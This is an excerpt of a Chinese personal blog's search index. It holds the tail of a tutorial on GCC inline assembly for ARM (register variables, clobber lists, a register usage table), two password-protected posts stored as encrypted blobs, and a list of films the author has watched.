为了改变函数名，你需要一个原型声明，因为编译器不接受在函数定义中出现asm关键字。 extern long Calc(void) asm (“CALCULATE”) 调用函数calc()将会创建调用函数CALCULATE的汇编指令。 强制使用特定的寄存器 局部变量可能存储在一个寄存器中。你可以利用内嵌汇编为该变量指定一个特定的寄存器。 void Count(void) { register unsigned char counterasm(“r3”); … some code… asm volatile(“eor r3, r3,r3”); … more code… } 汇编指令“eor r3, r3, r3”，会将r3清零。Waring：该例子在到多数情况下是有问题的，因为这将和优化器相冲突。因为GCC不会预留其它寄存器。要是优化器认为该变量在以后一段时间没有使用，那么该寄存器将会被再次使用。但是编译器并没有能力去检查是否和编译器预先定义的寄存器有冲突。如果你用这种方式指定了太多的寄存器，编译器将会在代码生成的时候耗尽寄存器的。 临时使用寄存器 如果你使用了寄存器，而你没有在input或output operand传递，那么你就必须向编译器指明这些。下面的例子中使用r3作为scratch 寄存器，通过在clobber list中写r3，来让编译器得知使用该寄存器。由于ands指令跟新了状态寄存器的标志位，使用cc在clobber list中指明。 asm volatile( “ands r3, %1, #3” “\n\t” “eor %0, %0, r3” “\n\t” “addne %0, #4” : “=r” (len) : “0” (len) : “cc”, “r3” ); 最好的方法是使用桩函数并且使用局部临时变量 寄存器的用途 比较好的方法是分析编译后的汇编列表，并且学习C 编译器生成的代码。下面的列表是编译器将ARM核寄存器的典型用途，知道这些将有助于理解代码。 Register Alt. Name Usage r0 a1 First function argumentInteger function resultScratch register r1 a2 Second function argumentScratch register r2 a3 Third function argumentScratch register r3 a4 Fourth function argumentScratch register r4 v1 Register variable r5 v2 Register variable r6 v3 Register variable r7 v4 Register variable r8 v5 Register variable= r9 v6 rfpRegister variableReal frame pointer r10 sl Stack limit r11 fp Argument pointer r12 ip Temporary workspace r13 sp Stack pointer r14 lr Link register Workspace r15 pc Program counter]]></content>
  </entry>
  <entry>
    <title><![CDATA[LOVE]]></title>
    <url>%2F2019%2F05%2F27%2FLOVE%2F</url>
    <content type="text"><![CDATA[Please enter the password to read. Incorrect Password! No content to display! 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]]></content>
  </entry>
  <entry>
    <title><![CDATA[Movie]]></title>
    <url>%2F2019%2F05%2F27%2FMovie%2F</url>
    <content type="text"><![CDATA[To the movieIn the wanda 战狼2 空天猎 极致追击 英伦对决 看不见的客人 羞羞的铁拳 天才枪手 王牌特工2：黄金圈 银翼杀手2049 全球风暴 雷神3：诸神黄昏 精灵宝可梦： 波尔凯尼恩与机巧的马机雅娜 正义联盟 恐袭波士顿 推理笔记 烟花 寻梦环游记 巨额来电 帕丁顿熊2 鲨海 奇门遁甲 心理罪之城市之光 芳华 疯狂特警队 妖猫传 机器之血 妖铃铃 前任3： 再见前任 二代妖精之今生有幸 星球大战：最后的绝地武士 勇敢者游戏： 决战丛林 无问西东 谜巢 英雄本色2018 神秘巨星 移动迷宫3： 死亡解药 绝命时钟2：22 24小时：末路重生 忌日快乐 南极之恋 唐人街探案2 红海行动 捉妖记2 小萝莉的猴神大叔 黑豹 解忧杂货店 古墓丽影：起源之战 环太平洋：雷霆再起 头号玩家 通勤营救 起跑线 湮灭 脱单告急 幕后玩家 后来的我们 哆啦A梦：大雄的金银岛 复仇者联盟3：无限战争 超时空同居 游侠索罗：星球大战外传 深海越狱 侏罗纪世界2 超人总动员2 龙虾刑警 金蝉脱壳2 我不是药神 动物世界 邪不压正 摩天营救 西虹市首富 解码游戏 爱情公寓 一出好戏 快把我哥带走 欧洲攻略 蚁人2：黄蜂女现身 碟中谍6：全面瓦解 阿尔法：狼伴归途 反贪风暴3 影 无双 李茶的姑妈 我的间谍前男友 铁血战士 昨日青空 毒液：致命守护者 你好，之华 冰封侠：时空行者 飓风奇劫 名侦探柯南： 零的执行人 神奇动物： 格林德沃之罪 无敌破坏王2：大闹互联网 憨豆特工3 无名之辈 海王 龙猫 网络迷踪 天气预爆 来电狂响 蜘蛛侠：平行宇宙 地球最后的夜晚 大黄蜂 “大”人物 命运之夜——天之杯：恶兆之花 白蛇：缘起 密室逃生 死侍2：我爱我家 掠食城市 廉政风云4 流浪地球 疯狂外星人 飞驰人生 一吻定情 阿丽塔：战斗天使 驯龙高手3 惊奇队长 过春天 比悲伤更悲伤的故事 波西米亚狂想曲 乐高大电影2 海市蜃楼 反贪风暴4 风中有朵雨做的云 雷霆沙赞！ 复仇者联盟4： 终局之战 祈祷落幕时 调音师 何以为家 大侦探皮卡丘 阿拉丁 哥斯拉2：怪兽之王 哆啦A梦：大雄的月球探险 X战警：黑凤凰 追龙II 绝杀慕尼黑 秦明·生死语者 黑衣人：全球追缉 玩具总动员4 千与千寻 蜘蛛侠：英雄远征 扫毒2：天地对决 爱宠大机密2 哪吒之魔童降世 烈火英雄 使徒行者2：碟影行动 沉默的证人 全职高手之巅峰荣耀 愤怒的小鸟2 铤而走险 罗小黑战记 检察方的罪人 宝莱坞机器人2.0：重生归来 罗小黑战记 名侦探柯南：绀青之拳 诛仙I 小Q 友情以上 中国机长 我和我的祖国 攀登者 犯罪现场 航海王：狂热行动 双子杀手 沉睡魔咒2 少年的你 天气之子 终结者：黑暗命运 受益人 霹雳娇娃 海上钢琴师 冰雪奇缘2 冰峰暴 两只老虎 勇敢者游戏2：再战巅峰 误杀 星球大战：天行者崛起 叶问4：完结篇 特警队]]></content>
  </entry>
  <entry>
    <title><![CDATA[Magic]]></title>
    <url>%2F2019%2F05%2F20%2FMagic%2F</url>
    <content type="text"><![CDATA[Welcome to my blog, enter password to read. Incorrect Password! No content to display! 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